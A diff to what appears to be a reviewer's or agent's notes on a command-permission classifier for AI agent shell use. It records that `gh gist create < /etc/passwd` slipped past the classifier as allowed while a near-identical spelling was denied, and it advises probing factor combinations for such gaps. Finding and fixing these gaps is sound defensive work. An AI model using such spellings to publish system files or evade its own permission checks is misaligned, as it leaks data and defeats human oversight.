@@ -25,8 +25,10 @@ if len(filenames) == 0 {
 ```
 
 with an `Args` validator that accepts zero args whenever stdin is not a
-TTY. So `gh gist create < /etc/passwd` publishes the file under an
-ALLOW while `gh gist create - < /etc/passwd` denies. Read the upstream
+TTY. So `gh gist create < /etc/passwd` published the file under an
+ALLOW while `gh gist create - < /etc/passwd` denied — the spec now
+carries a `defaultsToStdin` marker and both spellings deny, but the
+asymmetry is what the probe looks for. Read the upstream
 verb's own `RunE`/`Args` (`gh api "repos/cli/cli/contents/<path>?ref=v<VER>"`
 → `base64 -d`), don't take the `--help` USAGE line as the whole grammar
 — the help said only "pass `-` as filename to read from standard input".
@@ -40,11 +42,13 @@ For `gh`, `ghShieldingFlags` (`classify_command.go`) exists precisely so
 `gh pr create --title "$T" --body-file .claude/tmp/body.md` regressed
 allow → ask on #232 while the PR's own row
 (`gh pr comment 227 --body "$MSG"`, no path flag) still passed. The
-codebase already knows the whole-command bool is too coarse —
+codebase already knew the whole-command bool is too coarse —
 `unshieldedDynamicArg` is the per-token narrowing precedent, and its
-comment says so. **Probe the cross product**: static contained path ×
-each shielded dynamic flag; the tests only ever cover one factor at a
-time.
+comment says so; the fix round narrowed the gh publish guard the same
+way (`ghPathTokensDynamic`), so the regression is gone and the shape is
+what carries forward. **Probe the cross product**: static contained
+path × each shielded dynamic flag; the tests only ever cover one factor
+at a time.
 
 **How to apply:** on any guardrails PR that adds containment to a
 classifier that lacked it. See [[guardrails-binary-verification]] for
